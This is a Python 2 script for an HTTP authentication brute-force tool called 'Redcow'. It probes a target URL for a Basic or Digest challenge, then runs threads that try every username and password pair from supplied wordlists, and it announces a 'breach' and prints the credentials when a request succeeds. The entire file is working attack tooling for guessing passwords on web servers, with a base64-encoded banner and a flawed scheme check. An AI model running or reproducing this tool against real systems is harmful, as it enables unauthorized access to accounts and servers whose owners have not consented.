#!/usr/bin/env python2

import requests
import argparse
import os.path
import base64
import sys
import re

from requests.auth import HTTPDigestAuth
from threading import Thread
from Queue import Queue
from time import sleep

class Redcow(object):

    def __init__(self, url, userlist, passlist, workers):
        self.url = url
        self.userlist = self.__parse_list(userlist)
        self.passlist = passlist
        self.queueCreds = Queue(maxsize=0)
        self.workers = workers
        self.auth_scheme = ''
        self.auth_realm = ''
        self.__motd()
        self.__check_url()
        self.__load_creds()
        self.cracked = False

        print "[>] Starting to attack authentication using %s threads...\n" % (str(self.workers))

        for worker in xrange(int(self.workers)):
            _worker = Thread(target=self.Worker)
            _worker.daemon = True
            _worker.start()

    def Worker(self):
        while True:
            if self.queueCreds.empty() is not True:
                creds = self.queueCreds.get()

                msg = "\t[!] Attempting breach with: USER: \033[1m%15s\033[0m \t PASSWORD: \033[1m%15s\033[0m" % (creds["username"], creds["password"])
                sys.stdout.write('%s\r' % msg)
                sys.stdout.flush()
                sleep(0.025)

                if self.auth_scheme == "basic":
                    r = requests.get(self.url, auth=(creds["username"], creds["password"]))
                    sleep(0.1)
                elif self.auth_scheme == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(creds["username"], creds["password"]))
                    sleep(0.1)

                if r.status_code == 200:
                    self.cracked = True
                    print "\n\n\t[!] Breach was a SUCCESS - User[ \033[92m\033[1m%s\033[0m ] - Pass[ \033[92m\033[1m%s\033[0m ]\n" % (creds["username"], creds["password"])
                    self.queueCreds.task_done()
                    del creds
                else:
                    self.queueCreds.task_done()
                    del creds
                    sleep(0.05)
            else:
                sleep(0.5)

    def __motd(self):
        data00 = "G1s5Mm0NCg0KICBfICAgICAgXyAgICAgICAgIF8gICAgICAgICAgICAgICAgICBfICAgICAgICAgXyAgICAgICAgICAgIF8gICAgICAgICAgICAgXyAgICAgIA0KL18vXCAgICAvXCBcICAgICAvIC9cICAgICAgICAgICAgICAgIC9cIFwgICAgICAvIC9cICAgICAgICAgL1wgXCAgICAgICAgIC9cIFwgICAgIA0KXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIA0KIFwgXCBcX18vIC8gLyAgLyAvIC9cIFwgICAgICAgICAgICAvIC9cIFwgXCAgLyAvIC9cIFxfXyAgIC8gL1wgXCBcICAgICAvIC9cIFwgXCAgIA0KICBcIFxfXyBcL18vICAvIC8gL1wgXCBcICAgICAgICAgIC8gLyAvXCBcX1wvIC8gL1wgXF9fX1wgLyAvIC9cIFxfXCAgIC8gLyAvXCBcIFwgIA0KICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIA0KICAgIF8vXC9fX1wgXFwgXCBcICAgXCBcIFwgICAgICAvIC9fX19fL1wgICAgXCBcIFwgICAgIC8gL19fX18vXCAgICAvIC8gLyAgICBcL18vIA0KICAgLyBfL18vXCBcIFxcIFwgXCAgIFwgXCBcICAgIC8gL1xfX19fXC9fICAgIFwgXCBcICAgLyAvXF9fX19cLyAgIC8gLyAvICAgICAgICAgIA0KICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIA0KIC8gLyAvICAgIC9fLyAvIFwgXC9fX19fXCBcIFwvIC8gLyAgICAgIFwgXC9fX18vIC8gIC8gLyAvX19fX19fX1wvIC8gL19fX19fX19fX1wgIA0KIFwvXy8gICAgIFxfXC8gICBcX19fX19fX19fXC9cL18vICAgICAgICBcX19fX19cLyAgIFwvX19fX19fX19fXy9cL19fX19fX19fX19fXy8gIA0KDQobWzBtDQobWzkxbSAgICAgICAgICAgICAgICAgW1JFRENPVzogaHR0cCBhdXRoZW50aWNhdGlvbiBicnV0ZWZvcmNlIHRvb2xdDQobWzBtDQogICAgICAgICAgICAgICAgICAgICAgIGJ5OiAweDY0NjQ1ZkBwcm90b25tYWlsLmNvbQ0KDQo="
        print(base64.b64decode(data00))

    def __parse_list(self, x):
        if os.path.isfile(x):
            return ([line.rstrip('\n') for line in open(x)])
        else:
            return list([x])

    def __load_creds(self):
        msg = "[>] Building credentials database... "
        sys.stdout.write('%s\r' % msg)
        sys.stdout.flush()
        for _user in self.userlist:
            if os.path.isfile(self.passlist):
                with open(self.passlist) as infile:
                    for line in infile:
                        creds = dict(username=_user, password=str(line.rstrip()))
                        self.queueCreds.put(creds)
            else:
                creds = dict(username=_user, password=self.passlist)
                self.queueCreds.put(creds)

        msg = msg + "\033[92m\033[1mDONE\033[0m"
        sys.stdout.write('%s\r\n\n' % msg)
        sys.stdout.flush()

    def __check_url(self):
        msg = "[>] Checking URL(s) for HTTP_Authentication requests... "
        sys.stdout.write('%s\r' % msg)
        sys.stdout.flush()
        try:
            r = requests.get(self.url, timeout=10)
        except requests.exceptions.Timeout:
            msg = msg + "\033[91m\033[1mFAIL\033[0m"
            sys.stdout.write('%s\r' % msg)
            sys.stdout.flush()
            print "\n\n\t[ERROR] - Request timed out. Make sure the URL is not down and try again.\n"
            sys.exit(1)
        except requests.exceptions.TooManyRedirects:
            msg = msg + "\033[91m\033[1mFAIL\033[0m"
            sys.stdout.write('%s\r' % msg)
            sys.stdout.flush()
            print "\n\n\t[ERROR] - Request stuck in redirect loop exception. Check URL for redirect loop.\n"
            sys.exit(1)
        except requests.exceptions.RequestException:
            msg = msg + "\033[91m\033[1mFAIL\033[0m"
            sys.stdout.write('%s\r' % msg)
            sys.stdout.flush()
            print "\n\n\t[ERROR] - Request received a 'Connection Refused' reply. Is this URL service up?\n"
            sys.exit(1)

        auth_header = r.headers['www-authenticate']
        auth_objects = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
        auth_group = auth_objects.match(auth_header)
        self.auth_scheme = auth_group.group(1).lower()
        self.auth_realm = auth_group.group(2)

        if not self.auth_scheme == 'basic' or not 'digest':
            print "\n\t[ERROR] - \033[91mAuthentication Scheme not listed as '\033[1mBasic\033[0m' or '\033[1mDigest\033[0m'. Scheme not supported.\033[0m\n"
            sys.exit(1)

        msg = msg + "\033[92m\033[1mDONE\033[0m"
        sys.stdout.write('%s\r\n\n' % msg)
        sys.stdout.flush()

        print "\t[INFO] \033[92m\033[1mHTTP_Authentication URL\033[0m: \033[1m%s\033[0m\n" % self.url
        print "\t[INFO] \033[92m\033[1mHTTP_Authentication Realm\033[0m: \033[1m%s\033[0m\n" % self.auth_realm.capitalize()
        print "\t[INFO] \033[92m\033[1mHTTP_Authentication Scheme\033[0m: \033[1m%s\033[0m\n" % self.auth_scheme.capitalize()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    auth_group = parser.add_argument_group("Required Arguments")
    auth_group.add_argument('-t', required="true", dest="target_url", help="Target URL running Web Authentication")
    auth_group.add_argument('-u', required="true", dest="userlist", help="A username *OR* a file containing a list of users")
    auth_group.add_argument('-p', required="true", dest="passlist", help="A password *OR* a file containing a list of passwords")
    parser.add_argument('--threads', dest="threads", help="(Optional) Number of Threads to use. Default: 1")
    args = parser.parse_args()

    if not args.threads:
        args.threads = 1

    if not str(args.target_url).startswith("http"):
        args.target_url = "http://" + args.target_url

    Moo = Redcow(args.target_url, args.userlist, args.passlist, args.threads)
    Moo.queueCreds.join()

    while Moo.queueCreds.empty() != True:
        sleep(0.5)
    else:
        if Moo.cracked is True:
            sys.exit(0)
        else:
            print "\n\n[>] Sorry, the credentials provided did not work. Try again using different user/pass lists.\n"
            sys.exit(0)